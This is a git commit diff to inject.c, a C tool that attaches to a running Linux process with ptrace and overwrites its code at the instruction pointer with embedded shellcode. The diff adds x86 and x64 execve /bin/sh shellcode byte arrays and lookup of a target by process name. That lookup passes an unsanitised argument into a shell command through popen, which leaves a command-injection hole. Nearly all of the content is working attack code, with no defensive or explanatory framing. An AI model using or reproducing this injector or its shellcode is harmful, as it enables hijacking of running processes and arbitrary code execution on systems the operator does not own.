aeed43acf5247a2a3c4f631ae5769b5c0cacf907
meep-github <36815692+meep-github@users.noreply.github.com>
2019-05-24 00:58:17 +0100

    Update inject.c
    Added x86 and x64 support and automatic detection

--- src/inject.c
+++ src/inject.c
@@ -4,10 +4,18 @@
 #include<stdint.h>
 #include<string.h>
 
+#include<ctype.h>
+
 #include<sys/ptrace.h>
 #include<sys/user.h>
 #include<sys/wait.h>
 
+#ifndef BYTE
+typedef unsigned char BYTE;
+struct assem_instructor { BYTE _shellcode_[512]; } assem_ins;
+#endif
+
+void usage( char *__msg, bool __exit, int __code );
 bool AttachToPID( unsigned int __pid );
 bool GetRegisters(
 				struct user_regs_struct *__regs,
@@ -17,30 +25,76 @@ bool InjectShellcode(
 				struct user_regs_struct *__regs,
 				//void *__rip,
 				unsigned int __pid,
+				BYTE __shelcode[],
 				unsigned int __shellcode_size
 		    );
 bool DetachFromPID( unsigned int __pid );
 
-/*
-char _shellcode_[] = "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
-        	     "\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00"
-           	     "\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6"
-        	     "\x0f\x05"; //	              /bin/sh
-				 //		    linux x64 bit
-				 // Raw String Version \x instead of 0x HEX initializer
-*/
-
-char _shellcode_[] = { 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53,
-		       0x48, 0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8, 0x08, 0x00,
-		       0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6,
-			     									     0x0f, 0x05 };
+////////////////////////////
+// ARCHITECTURE LINUX x64
+char _shellcode_x64_[] = { 0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53, // EXEC VIA=/bin/sh
+			   0x48,0x89,0xe7,0x68,0x2d,0x63,0x00,0x00,0x48,0x89,0xe6,0x52,0xe8,0x08,0x00, // CMD=/bin/sh
+			   0x00,0x00,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x56,0x57,0x48,0x89,0xe6,
+											    0x0f,0x05 };
+// ARCHITECTURE LINUX x86
+char _shellcode_x86_[] = { 0x6a,0x0b,0x58,0x99,0x52,0x66,0x68,0x2d,0x63,0x89,0xe7,0x68,0x2f,0x73,0x68, // EXEC VIA=/bin/sh
+			   0x00,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x52,0xe8,0x08,0x00,0x00,0x00,0x2f, // CMD=/bin/sh
+			   0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x57,0x53,0x89,0xe1,0xcd,0x80 };
+////////////////////////////
 
 int main(
 		int argc,
 		char ** argv
 	) {
 
-	unsigned int pid = atoi(argv[1]);
+	#define USAGE "\nUsage: $ ./inject [-p PROCESS ID | -n PROCESS NAME]\n\n"
+	if(!argv[1] || !argv[2]) usage(USAGE, true, -1);
+
+	pid_t pid;
+	char cchoice;
+	char processName[128];
+	bool use_pname = false;
+
+	cchoice = tolower(argv[1][1]);
+	int choice = (int)cchoice;
+
+//	do {
+		switch(choice) {
+			case 112:
+				pid = atoi(argv[2]);
+				break;
+			case 110:
+				snprintf(processName, sizeof(processName), "%s", argv[2]);
+				use_pname = true;
+				break;
+			default:
+				usage(USAGE, false, 0);
+				exit(-1);
+		}
+//	} while(!pid);
+
+	struct assem_instructor __injector;
+	if ((size_t)-1 > 0xffffffffUL) {
+		memset(__injector._shellcode_, '\0', sizeof(__injector._shellcode_));
+		memcpy(__injector._shellcode_, _shellcode_x64_, sizeof(_shellcode_x64_));
+	}
+    	else {
+		memset(__injector._shellcode_, '\0', sizeof(__injector._shellcode_));
+		memcpy(__injector._shellcode_, _shellcode_x86_, sizeof(_shellcode_x86_));
+	}
+	struct assem_instructor *injector = &__injector;
+
+	if(use_pname) {
+		char command[256]; char result[32];
+		snprintf(command, sizeof(command), "ps -h | grep %s | awk {'print $1'} | head -n 1", processName);
+		FILE *fp = popen(command, "r");
+		fgets(result, sizeof(result), fp);
+		pid = atoi(result);
+		printf("[!] Found Process ID %d From Process Name %s\n\n", pid, processName);
+	}
+
+
+
 	struct user_regs_struct ASSEMREGS;
 	bool attached = AttachToPID( pid );
 	printf("\033[0m[+] Process Attachment Status: %s\n", attached?"\033[01;32mSuccess\033[0m":"\033[01;31mFailed\033[0m");
@@ -53,16 +107,19 @@ int main(
 	printf("[+] Registers Read Status: %s\n", registered?"\033[01;32mSuccess\033[0m":"\033[01;31mFailed\033[0m");
 
 	printf("[+] Injecting Shellcode Into Current RIP Address [%x]\n", ASSEMREGS.rip);
-	bool injected = InjectShellcode( &ASSEMREGS, pid, sizeof(_shellcode_) );
+	bool injected = InjectShellcode( &ASSEMREGS, pid, injector->_shellcode_, sizeof(injector->_shellcode_));
 	printf("[+] Injection Status: %s\n",  injected?"\033[01;32mSuccess\033[0m":"\033[01;31mFailed\033[0m");
 
 	printf("\nDetaching ... ");
 	bool detached = DetachFromPID( pid );
 	if (detached) printf("Done.\n");
+
 	return 0;
 }
 
-
+void usage( char *__msg, bool __exit, int __code ) {
+	printf(__msg); if(__exit) exit(__code);
+}
 bool AttachToPID( unsigned int __pid ) {
 	if((ptrace(PTRACE_ATTACH, __pid, NULL, 0)) < 0) return false;
 	return true;
@@ -78,9 +135,10 @@ bool InjectShellcode(
 				struct user_regs_struct *__regs,
 				//void *__rip,
 				unsigned int __pid,
+				BYTE __shellcode[],
 				unsigned int __shellcode_size
 		     ) {
-	for(int i = 0; i < __shellcode_size; i++) ptrace(PTRACE_POKETEXT, __pid, __regs->rip+i, *(int*)(_shellcode_ + i));
+	for(int i = 0; i < __shellcode_size; i++) ptrace(PTRACE_POKETEXT, __pid, __regs->rip+i, *(int*)(__shellcode + i));
 	return true;
 }
 bool DetachFromPID( unsigned int __pid ) {
